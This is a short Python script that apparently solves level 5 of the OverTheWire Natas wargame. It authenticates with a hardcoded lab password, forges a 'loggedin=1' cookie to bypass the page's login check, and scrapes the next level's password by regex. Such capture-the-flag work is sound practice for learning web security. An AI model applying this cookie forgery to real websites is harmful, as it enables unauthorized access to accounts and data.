import requests
import re

s = requests.session()
s.auth = ("natas5","iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq")
game = s.get("http://natas5.natas.labs.overthewire.org/", cookies ={"loggedin":"1"})

cookies = {"loggedin":1}
nextcode = re.findall('[a-zA-Z0-9]{32}',game.text)


print(nextcode[1])